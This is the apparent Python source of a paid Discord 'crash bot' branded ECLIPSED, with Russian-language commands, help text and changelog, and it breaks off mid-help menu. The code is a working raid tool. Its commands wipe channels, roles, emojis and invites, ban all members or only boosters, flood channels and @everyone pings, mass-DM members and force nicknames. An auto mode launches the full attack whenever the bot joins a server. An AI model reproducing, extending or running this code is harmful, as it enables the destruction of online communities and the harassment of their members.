import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import aiohttp
import json
import os
import logging
import config

# Логирование в файл
logging.basicConfig(
    filename="bot.log",
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    encoding="utf-8"
)
log = logging.getLogger(__name__)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)


# ─── HELPERS ───────────────────────────────────────────────

nuke_running = {}
nuke_starter = {}   # guild_id -> user_id кто запустил нюк
last_spam_text = {}  # guild_id -> последний текст спама
last_nuke_time = {}  # guild_id -> время последнего nuke


def is_whitelisted(user_id):
    return user_id in config.WHITELIST


def is_owner_whitelisted(user_id):
    return user_id in config.OWNER_WHITELIST


def is_premium(user_id):
    return user_id in PREMIUM_LIST


def save_whitelist():
    with open("whitelist.json", "w") as f:
        json.dump(config.WHITELIST, f)


def save_owner_whitelist():
    with open("owner_whitelist.json", "w") as f:
        json.dump(config.OWNER_WHITELIST, f)


def save_premium():
    with open("premium.json", "w") as f:
        json.dump(PREMIUM_LIST, f)


def load_whitelist():
    if os.path.exists("whitelist.json"):
        with open("whitelist.json", "r") as f:
            config.WHITELIST = json.load(f)
    if os.path.exists("owner_whitelist.json"):
        with open("owner_whitelist.json", "r") as f:
            config.OWNER_WHITELIST = json.load(f)


def load_premium():
    global PREMIUM_LIST
    if os.path.exists("premium.json"):
        with open("premium.json", "r") as f:
            PREMIUM_LIST = json.load(f)


def save_spam_text():
    with open("spam_text.json", "w") as f:
        json.dump({"text": config.SPAM_TEXT}, f, ensure_ascii=False)


def load_spam_text():
    if os.path.exists("spam_text.json"):
        with open("spam_text.json", "r", encoding="utf-8") as f:
            data = json.load(f)
            config.SPAM_TEXT = data.get("text", config.SPAM_TEXT)


# ─── BLOCKED GUILDS ────────────────────────────────────────

BLOCKED_GUILDS: list[int] = []
PREMIUM_LIST: list[int] = []


def save_blocked_guilds():
    with open("blocked_guilds.json", "w") as f:
        json.dump(BLOCKED_GUILDS, f)


def load_blocked_guilds():
    global BLOCKED_GUILDS
    if os.path.exists("blocked_guilds.json"):
        with open("blocked_guilds.json", "r") as f:
            BLOCKED_GUILDS = json.load(f)


def is_guild_blocked(guild_id: int) -> bool:
    return guild_id in BLOCKED_GUILDS


def wl_check():
    async def predicate(ctx):
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="☠️ ДОСТУП ЗАПРЕЩЁН",
                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ ECLIPSED SQUAD")
            await ctx.send(embed=embed)
            return False
        return True
    return commands.check(predicate)


async def delete_all_channels(guild):
    for _ in range(3):  # до 3 попыток
        channels = list(guild.channels)
        if not channels:
            break
        await asyncio.gather(*[c.delete() for c in channels], return_exceptions=True)
        await asyncio.sleep(1.5)


async def delete_all_roles(guild):
    bot_role = guild.me.top_role
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )


async def do_nuke(guild, spam_text=None):
    if spam_text is None:
        spam_text = config.SPAM_TEXT
    try:
        await guild.edit(name=config.GUILD_NAME)
    except Exception:
        pass

    boosters = [m for m in guild.members if m.premium_since is not None]
    bot_role = guild.me.top_role

    # Удаляем каналы, роли и баним бустеров одновременно
    await asyncio.gather(
        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
        asyncio.gather(*[m.ban(reason="Booster") for m in boosters], return_exceptions=True),
        return_exceptions=True
    )

    # Создаём каналы и сразу спамим в каждый по мере создания
    created_channels = []

    async def create_and_spam(i):
        try:
            if not nuke_running.get(guild.id):
                return
            ch = await guild.create_text_channel(name=config.GUILD_NAME)
            created_channels.append(ch)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()


# ─── COMMANDS ──────────────────────────────────────────────

@bot.command()
@wl_check()
async def nuke(ctx, *, text: str = None):
    guild = ctx.guild
    if nuke_running.get(guild.id):
        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
        await ctx.send(embed=embed)
        return
    # Кастомный текст — только для premium или овнера
    # Без премиума — запускаем с дефолтным текстом, кастомный игнорируем
    if text and not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
        text = None  # сбрасываем на дефолт
    nuke_running[guild.id] = True
    nuke_starter[guild.id] = ctx.author.id
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
    last_spam_text[ctx.guild.id] = spam_text
    asyncio.create_task(do_nuke(guild, spam_text))


@bot.command()
@wl_check()
async def stop(ctx):
    guild = ctx.guild
    uid = ctx.author.id
    starter_id = nuke_starter.get(guild.id)

    # Овнер останавливает всегда
    if uid == config.OWNER_ID:
        nuke_running[guild.id] = False
        nuke_starter.pop(guild.id, None)
        await ctx.send("✅ Остановлено.")
        return

    # Никто не запускал — просто останавливаем
    if starter_id is None:
        nuke_running[guild.id] = False
        await ctx.send("✅ Остановлено.")
        return

    # Запустил овнер — только овнер может остановить
    if starter_id == config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Нюк запущен **овнером** — только он может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ ECLIPSED SQUAD")
        await ctx.send(embed=embed)
        return

    # Запустил премиум — только премиум или овнер может остановить
    if is_premium(starter_id) and not is_premium(uid):
        embed = discord.Embed(
            description="❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ ECLIPSED SQUAD")
        await ctx.send(embed=embed)
        return

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    await ctx.send("✅ Остановлено.")


@bot.command()
@wl_check()
async def addch(ctx, count: int = 10, *, name: str = None):
    if count > 500:
        await ctx.send("Максимум 500.")
        return
    ch_name = name if name else config.GUILD_NAME
    results = await asyncio.gather(
        *[ctx.guild.create_text_channel(name=ch_name) for _ in range(count)],
        return_exceptions=True
    )
    done = sum(1 for r in results if not isinstance(r, Exception))
    log.info("!addch %s каналов на %s от %s", done, ctx.guild, ctx.author)
    await ctx.send(f"Создано {done} каналов.")


@bot.command()
@wl_check()
async def cleanup(ctx):
    await delete_all_channels(ctx.guild)
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(
            view_channel=True,
            send_messages=False
        )
    }
    for uid in config.WHITELIST:
        member = ctx.guild.get_member(uid)
        if not member:
            try:
                member = await ctx.guild.fetch_member(uid)
            except Exception:
                continue
        overwrites[member] = discord.PermissionOverwrite(
            view_channel=True,
            send_messages=True
        )
    channel = await ctx.guild.create_text_channel("general", overwrites=overwrites)
    # Отправляем текст спама только если nuke был менее 30 секунд назад
    nuke_time = last_nuke_time.get(ctx.guild.id)
    if nuke_time and (asyncio.get_running_loop().time() - nuke_time) <= 30:
        text = last_spam_text.get(ctx.guild.id)
        if text:
            await channel.send(text)


@bot.command()
@wl_check()
@commands.cooldown(1, 30, commands.BucketType.guild)
async def rename(ctx, *, name: str):
    await asyncio.gather(*[c.edit(name=name) for c in ctx.guild.channels], return_exceptions=True)
    await ctx.send("Готово.")


@rename.error
async def rename_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"⏳ Команда на кулдауне. Подожди **{error.retry_after:.0f}** сек.")


@bot.command()
@wl_check()
async def invs_delete(ctx):
    invites = await ctx.guild.invites()
    await asyncio.gather(*[i.delete() for i in invites], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
@wl_check()
async def webhooks(ctx):
    whs = await ctx.guild.webhooks()
    if not whs:
        await ctx.send("Вебхуков нет.")
        return
    msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
    await ctx.send(f"```{msg[:1900]}```")


@bot.command()
@wl_check()
async def nicks_all(ctx, *, nick: str):
    targets = [m for m in ctx.guild.members if m.id not in (ctx.author.id, bot.user.id, ctx.guild.owner_id)]
    await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
@wl_check()
async def auto_nuke(ctx, state: str):
    if state.lower() == "on":
        config.AUTO_NUKE = True
        await ctx.send("✅ Авто-краш включен.")
    elif state.lower() == "off":
        config.AUTO_NUKE = False
        await ctx.send("❌ Авто-краш выключен.")
    elif state.lower() == "info":
        status = "✅ Включён" if config.AUTO_NUKE else "❌ Выключен"
        await ctx.send(f"Авто-краш: {status}")
    else:
        await ctx.send("Используй: `!auto_nuke on` / `!auto_nuke off` / `!auto_nuke info`")


@bot.command()
@wl_check()
async def inv(ctx):
    app_id = bot.user.id
    url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
    await ctx.author.send(f"Добавить бота на сервер: {url}\nДобавить себе: https://discord.com/oauth2/authorize?client_id={app_id}&scope=applications.commands&integration_type=1")



@bot.command(name="wl_add")
@wl_check()
async def wl_add(ctx, user_id: int):
    if user_id not in config.WHITELIST:
        config.WHITELIST.append(user_id)
        save_whitelist()
        await ctx.send(f"✅ `{user_id}` добавлен.")
    else:
        await ctx.send("Уже в whitelist.")


@bot.command(name="wl_remove")
@wl_check()
async def wl_remove(ctx, user_id: int):
    if user_id in config.WHITELIST:
        config.WHITELIST.remove(user_id)
        save_whitelist()
        await ctx.send(f"✅ `{user_id}` убран.")
    else:
        await ctx.send("Не найден.")


@bot.command(name="wl_list")
@wl_check()
async def wl_list(ctx):
    if not config.WHITELIST:
        await ctx.send("Whitelist пуст.")
        return
    lines = []
    for uid in config.WHITELIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` — **{user}**")
        except Exception:
            lines.append(f"`{uid}` — *не найден*")
    embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.WHITELIST)}")
    await ctx.send(embed=embed)


# ─── OWNER-ONLY: PREMIUM ───────────────────────────────────

@bot.command(name="pm_add")
async def pm_add(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id not in PREMIUM_LIST:
        PREMIUM_LIST.append(user_id)
        save_premium()
        await ctx.send(f"💎 `{user_id}` получил **Premium** — кастомный текст для `!nuke` разблокирован.")
    else:
        await ctx.send("Уже в Premium.")


@bot.command(name="pm_remove")
async def pm_remove(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id in PREMIUM_LIST:
        PREMIUM_LIST.remove(user_id)
        save_premium()
        await ctx.send(f"✅ `{user_id}` убран из Premium.")
    else:
        await ctx.send("Не найден в Premium.")


@bot.command(name="pm_list")
async def pm_list(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    if not PREMIUM_LIST:
        await ctx.send("Premium список пуст.")
        return
    lines = []
    for uid in PREMIUM_LIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` — **{user}**")
        except Exception:
            lines.append(f"`{uid}` — *не найден*")
    embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
    await ctx.send(embed=embed)


# ─── PREMIUM COMMANDS ──────────────────────────────────────

def premium_check():
    async def predicate(ctx):
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="☠️ ДОСТУП ЗАПРЕЩЁН",
                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ ECLIPSED SQUAD")
            await ctx.send(embed=embed)
            return False
        if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
            embed = discord.Embed(
                title="💎 PREMIUM ФУНКЦИЯ",
                description="Эта команда доступна только **Premium** пользователям.\n\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ ECLIPSED SQUAD")
            await ctx.send(embed=embed)
            return False
        return True
    return commands.check(predicate)


@bot.command(name="massdm")
@premium_check()
async def massdm(ctx, *, text: str):
    guild = ctx.guild
    members = [m for m in guild.members if not m.bot]
    sent = 0
    failed = 0
    status_msg = await ctx.send(embed=discord.Embed(
        description=f"📨 Рассылаю ДМ {len(members)} участникам...",
        color=0x0a0a0a
    ))
    for member in members:
        try:
            await member.send(text)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.5)
    embed = discord.Embed(
        title="📨 Mass DM завершён",
        description=f"✅ Отправлено: **{sent}**\n❌ Не доставлено: **{failed}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD")
    await status_msg.edit(embed=embed)


@bot.command(name="massban")
@premium_check()
async def massban(ctx):
    guild = ctx.guild
    bot_role = guild.me.top_role
    targets = [
        m for m in guild.members
        if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id
        and (not m.top_role or m.top_role < bot_role)
    ]
    status_msg = await ctx.send(embed=discord.Embed(
        description=f"💀 Баню {len(targets)} участников...",
        color=0x0a0a0a
    ))
    results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
    banned = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        title="💀 Mass Ban завершён",
        description=f"✅ Забанено: **{banned}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD")
    await status_msg.edit(embed=embed)


@bot.command(name="spam")
@premium_check()
async def spam_cmd(ctx, count: int, *, text: str):
    if count > 50:
        await ctx.send("Максимум 50.")
        return
    mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
    for _ in range(count):
        try:
            await ctx.send(text, allowed_mentions=mentions)
            await asyncio.sleep(0.5)
        except Exception:
            pass


@bot.command(name="pingspam")
@premium_check()
async def pingspam(ctx, count: int = 10):
    if count > 30:
        await ctx.send("Максимум 30.")
        return
    mentions = discord.AllowedMentions(everyone=True)
    for _ in range(count):
        try:
            await ctx.send("@everyone @here", allowed_mentions=mentions)
            await asyncio.sleep(0.5)
        except Exception:
            pass


@bot.command(name="rolesdelete")
@premium_check()
async def rolesdelete(ctx):
    guild = ctx.guild
    bot_role = guild.me.top_role
    results = await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )
    deleted = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        description=f"🗑️ Удалено ролей: **{deleted}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD")
    await ctx.send(embed=embed)


@bot.command(name="emojisnuke")
@premium_check()
async def emojisnuke(ctx):
    guild = ctx.guild
    results = await asyncio.gather(*[e.delete() for e in guild.emojis], return_exceptions=True)
    deleted = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        description=f"💀 Удалено эмодзи: **{deleted}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD")
    await ctx.send(embed=embed)


@bot.command(name="serverinfo")
@premium_check()
async def serverinfo(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"☠️ {guild.name}",
        color=0x0a0a0a
    )
    embed.add_field(name="👥 Участников", value=str(guild.member_count))
    embed.add_field(name="📢 Каналов", value=str(len(guild.channels)))
    embed.add_field(name="🎭 Ролей", value=str(len(guild.roles)))
    embed.add_field(name="💎 Буст уровень", value=str(guild.premium_tier))
    embed.add_field(name="🚀 Бустеров", value=str(guild.premium_subscription_count))
    embed.add_field(name="🆔 ID сервера", value=str(guild.id))
    embed.add_field(name="👑 Овнер", value=str(guild.owner))
    embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="☠️ ECLIPSED SQUAD")
    await ctx.send(embed=embed)


@bot.command(name="userinfo")
@premium_check()
async def userinfo(ctx, user_id: int = None):
    if user_id:
        try:
            user = await bot.fetch_user(user_id)
        except Exception:
            await ctx.send("Пользователь не найден.")
            return
    else:
        user = ctx.author
    member = ctx.guild.get_member(user.id) if ctx.guild else None
    embed = discord.Embed(
        title=f"👁️ {user}",
        color=0x0a0a0a
    )
    embed.add_field(name="🆔 ID", value=str(user.id))
    embed.add_field(name="📅 Аккаунт создан", value=user.created_at.strftime("%d.%m.%Y"))
    if member:
        embed.add_field(name="📥 Зашёл на сервер", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
        embed.add_field(name="🎭 Высшая роль", value=member.top_role.mention)
        embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
    if user.avatar:
        embed.set_thumbnail(url=user.avatar.url)
    embed.set_footer(text="☠️ ECLIPSED SQUAD")
    await ctx.send(embed=embed)


# ─── AUTO SUPER NUKE ───────────────────────────────────────

AUTO_SUPER_NUKE = False
AUTO_SUPER_NUKE_TEXT = None  # None = использовать config.SPAM_TEXT
# Настройки что делать при auto_super_nuke
SNUKE_CONFIG = {
    "massban": True,       # банить всех
    "boosters_only": False, # банить только бустеров
    "rolesdelete": True,   # удалить роли
    "pingspam": True,      # пинг спам
    "massdm": False,       # масс дм
}


def save_auto_super_nuke():
    with open("auto_super_nuke.json", "w", encoding="utf-8") as f:
        json.dump({
            "enabled": AUTO_SUPER_NUKE,
            "text": AUTO_SUPER_NUKE_TEXT,
            "config": SNUKE_CONFIG
        }, f, ensure_ascii=False)


def load_auto_super_nuke():
    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT, SNUKE_CONFIG
    if os.path.exists("auto_super_nuke.json"):
        with open("auto_super_nuke.json", "r", encoding="utf-8") as f:
            data = json.load(f)
            AUTO_SUPER_NUKE = data.get("enabled", False)
            AUTO_SUPER_NUKE_TEXT = data.get("text", None)
            if "config" in data:
                SNUKE_CONFIG.update(data["config"])


@bot.command(name="auto_super_nuke")
@premium_check()
async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT
    if state.lower() == "on":
        AUTO_SUPER_NUKE = True
        save_auto_super_nuke()
        embed = discord.Embed(
            title="💀 Auto Super Nuke — ВКЛЮЧЁН",
            description=(
                "При входе бота на сервер автоматически:\n"
                "• Нюк с твоим текстом (или дефолтным)\n"
                "• Массбан всех участников\n"
                "• Удаление всех ролей\n"
                "• Пинг спам @everyone\n\n"
                f"Текст: `{AUTO_SUPER_NUKE_TEXT or 'дефолтный'}`\n"
                "Чтобы задать текст: `!auto_super_nuke text <твой текст>`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ ECLIPSED SQUAD")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_SUPER_NUKE = False
        save_auto_super_nuke()
        embed = discord.Embed(description="❌ **Auto Super Nuke** выключен.", color=0x0a0a0a)
        embed.set_footer(text="☠️ ECLIPSED SQUAD")
        await ctx.send(embed=embed)
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_super_nuke text <твой текст>`")
            return
        AUTO_SUPER_NUKE_TEXT = text
        save_auto_super_nuke()
        embed = discord.Embed(
            title="✅ Текст Auto Super Nuke обновлён",
            description=f"```{text[:500]}```",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Теперь включи: !auto_super_nuke on")
        await ctx.send(embed=embed)
    elif state.lower() == "info":
        status = "✅ Включён" if AUTO_SUPER_NUKE else "❌ Выключен"
        cur_text = AUTO_SUPER_NUKE_TEXT or config.SPAM_TEXT
        embed = discord.Embed(
            title="💀 Auto Super Nuke — INFO",
            description=(
                f"Статус: **{status}**\n\n"
                "При входе бота на сервер:\n"
                "• Нюк с кастомным текстом\n"
                "• Массбан всех участников\n"
                "• Удаление всех ролей\n"
                "• Пинг спам @everyone\n\n"
                f"Текущий текст:\n```{cur_text[:300]}```"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ ECLIPSED SQUAD")
        await ctx.send(embed=embed)
    else:
        await ctx.send(
            "Использование:\n"
            "`!auto_super_nuke on` — включить\n"
            "`!auto_super_nuke off` — выключить\n"
            "`!auto_super_nuke text <текст>` — задать текст\n"
            "`!auto_super_nuke info` — статус и текущий текст"
        )


@bot.command(name="snuke_config")
@premium_check()
async def snuke_config(ctx, option: str = None, value: str = None):
    """Настройка что делает auto_super_nuke при входе на сервер"""
    options = {
        "massban":      ("Массбан всех участников", "massban"),
        "boosters":     ("Банить только бустеров", "boosters_only"),
        "rolesdelete":  ("Удаление всех ролей", "rolesdelete"),
        "pingspam":     ("Пинг спам @everyone", "pingspam"),
        "massdm":       ("Масс ДМ всем участникам", "massdm"),
    }

    if not option:
        # Показать текущие настройки
        embed = discord.Embed(
            title="⚙️ SUPER NUKE — НАСТРОЙКИ",
            description=(
                "Управляй что делает `!auto_super_nuke` при входе на сервер.\n"
                "Использование: `!snuke_config <опция> on/off`"
            ),
            color=0x0a0a0a
        )
        lines = []
        for key, (label, cfg_key) in options.items():
            status = "✅" if SNUKE_CONFIG.get(cfg_key) else "❌"
            lines.append(f"{status} `{key}` — {label}")
        embed.add_field(name="Текущие настройки", value="\n".join(lines), inline=False)
        embed.add_field(
            name="Опции",
            value=(
                "`massban` — банить всех участников\n"
                "`boosters` — банить только бустеров (если massban выкл)\n"
                "`rolesdelete` — удалять все роли\n"
                "`pingspam` — пинг спам @everyone\n"
                "`massdm` — масс ДМ всем участникам"
            ),
            inline=False
        )
        embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Нюк всегда включён")
        await ctx.send(embed=embed)
        return

    if option not in options:
        await ctx.send(f"❌ Неизвестная опция `{option}`. Доступные: `{'`, `'.join(options.keys())}`")
        return
    if value not in ("on", "off"):
        await ctx.send("Укажи `on` или `off`.")
        return

    cfg_key = options[option][1]
    SNUKE_CONFIG[cfg_key] = (value == "on")
    save_auto_super_nuke()

    status = "✅ включено" if value == "on" else "❌ выключено"
    embed = discord.Embed(
        description=f"**{options[option][0]}** — {status}",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD")
    await ctx.send(embed=embed)


# ─── OWNER-ONLY: BLOCK / UNBLOCK GUILD ─────────────────────

@bot.command(name="block_guild", aliases=["block_guid"])
async def block_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!block_guild <id>`")
        return
    if gid not in BLOCKED_GUILDS:
        BLOCKED_GUILDS.append(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
    else:
        await ctx.send("Сервер уже заблокирован.")


@bot.command(name="unblock_guild", aliases=["unblock_guid"])
async def unblock_guild(ctx, guild_id: int = None):
    if ctx.author.id != config.OWNER_ID:
        return
    gid = guild_id if guild_id else (ctx.guild.id if ctx.guild else None)
    if not gid:
        await ctx.send("Укажи ID сервера: `!unblock_guild <id>`")
        return
    if gid in BLOCKED_GUILDS:
        BLOCKED_GUILDS.remove(gid)
        save_blocked_guilds()
        guild_name = bot.get_guild(gid)
        name_str = f"**{guild_name.name}**" if guild_name else f"`{gid}`"
        await ctx.send(f"🔓 Сервер {name_str} разблокирован.")
    else:
        await ctx.send("Сервер не был заблокирован.")


@bot.command(name="blocked_guilds")
async def blocked_guilds_cmd(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    if not BLOCKED_GUILDS:
        await ctx.send("Нет заблокированных серверов.")
        return
    lines = []
    for gid in BLOCKED_GUILDS:
        g = bot.get_guild(gid)
        lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
    await ctx.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))


bot.remove_command("help")


@bot.command(name="changelog")
async def changelog(ctx):
    embed = discord.Embed(
        title="📋 CHANGELOG — ECLIPSED BOT",
        description="История обновлений бота.",
        color=0x0a0a0a
    )
    embed.add_field(
        name="🆕 v1.4 — Premium расширение",
        value=(
            "• `!massdm [текст]` — масс рассылка ДМ всем участникам\n"
            "• `!massban` — забанить всех участников сервера\n"
            "• `!spam [кол-во] [текст]` — спам в канал\n"
            "• `!pingspam [кол-во]` — спам @everyone пингами\n"
            "• `!rolesdelete` — удалить все роли\n"
            "• `!emojisnuke` — удалить все эмодзи\n"
            "• `!serverinfo` — подробная инфа о сервере\n"
            "• `!userinfo [id]` — инфа о пользователе\n"
            "• `!auto_super_nuke on/off/info` — авто нюк+бан+дм при входе бота"
        ),
        inline=False
    )
    embed.add_field(
        name="🆕 v1.3 — Монетизация и защита",
        value=(
            "• **Premium** система — кастомный текст в `!nuke` только для избранных\n"
            "• Без Premium текст игнорируется, нюк всё равно запускается\n"
            "• Блокировка серверов — `!block_guild` / `!unblock_guild`\n"
            "• Овнер может менять дефолтный текст нюка через `!set_spam_text`\n"
            "• Алиасы команд — `!block_guid` / `!unblock_guid` тоже работают"
        ),
        inline=False
    )
    embed.add_field(
        name="🎨 v1.2 — Редизайн и Owner Panel",
        value=(
            "• Полностью переработан дизайн всех меню — тёмный стиль ☠️\n"
            "• ASCII арт в заголовках, иконки 💀 ⚡ 🔱 👁️\n"
            "• Owner Panel через ЛС — `!owner_help`, `!guilds`, `!setguild`\n"
            "• Owner Whitelist — `!owl_add` / `!owl_remove` / `!owl_list`\n"
            "• Инвайт-ссылки со всех серверов — `!invlink`\n"
            "• При нюке каналы называются **DavaidKa Best**"
        ),
        inline=False
    )
    embed.add_field(
        name="⚡ v1.1 — Расширение функционала",
        value=(
            "• Авто-краш при входе бота на сервер — `!auto_nuke on/off`\n"
            "• Slash спам команды — `/sp`, `/spkd` с задержкой\n"
            "• Whitelist система — `!wl_add` / `!wl_remove` / `!wl_list`\n"
            "• `!cleanup`, `!addch`, `!rename`, `!nicks_all`, `!nsfw_all`\n"
            "• Управление через ЛС без выбора сервера"
        ),
        inline=False
    )
    embed.add_field(
        name="☠️ v1.0 — Запуск",
        value=(
            "• Базовый краш — `!nuke`, `!stop`\n"
            "• `!invs_delete`, `!unnsfw_all`, `!webhooks`, `!ip`\n"
            "• Логирование действий в файл"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
    await ctx.send(embed=embed)


@bot.command(name="help")
async def help_cmd(ctx):
    # Определяем уровень доступа пользователя
    uid = ctx.author.id
    is_owner = (uid == config.OWNER_ID)
    is_prem = is_premium(uid)
    is_wl = is_whitelisted(uid)

    embed = discord.Embed(
        title="☠️ ECLIPSED — CRASH BOT",
        description=(
            "```\n"
            "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
            " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
            " ██║     ██████╔╝███████║███████╗███████║\n"
            " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
            " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
            "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
            "```"
        ),
        color=0x0a0a0a
    )

    # Уровень доступа
    if is_owner:
        access_str = "👑 **OWNER** — полный доступ ко всем командам"
    elif is_prem:
        access_str = "💎 **PREMIUM** — доступ к расширенным командам"
    elif is_wl:
        access_str = "✅ **Обычная подписка** — базовые команды доступны"
    else:
        access_str = "❌ **Нет подписки** — доступ к командам закрыт"

    embed.add_field(name="🔑 Твой уровень доступа", value=access_str, inline=False)

    # Команды доступные ВСЕМ (без подписки)
    embed.add_field(
        name="📋 ДОСТУПНО ВСЕМ",
        value=(
            "`!help` — это меню\n"
            "`!changelog` — история обновлений бота"
        ),
        inline=False
    )

    # Команды для обычной подписки
    embed.add_field(
        name="✅ ОБЫЧНАЯ ПОДПИСКА",
        value=(
            "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
            "`!stop` — остановить краш\n"
            "`!cleanup` — снести всё, оставить один канал\n"
            "`!addch [кол-во]` — создать каналы\n"
            "`!rename [название]` — переименовать все каналы\n"
            "`!invs_delete` — уничтожить все инвайты\n"
            "`!nicks_all [ник]` — сменить ники всем\n"
            "`!webhooks` — список вебхуков\n"
            "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
            "`!inv` — ссылка для добавления бота\n"
            "`/sp [кол-во] [текст]` — спам\n"
            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
        ),
        inline=False
    )

    # Команды для Premium
    embed.add_field(
        name="💎 PREMIUM",
        value=(
            "`!nuke [текст]` — нюк со своим текстом\n"
            "`!massban` — забанить всех участников\n"
            "`!massdm [текст]` — разослать ДМ всем\n"
            "`!spam [кол-во] [текст]` — спам в канал\n"
            "`!pingspam [кол-во]` — спам @everyone\n"
            "`!rolesdelete` — удалить все роли\n"
            "`!emojisnuke` — удалить все эмодзи\n"
            "`!serverinfo` — подробная инфа о сервере\n"
            "`!userinfo [id]` — инфа о пользователе\n"
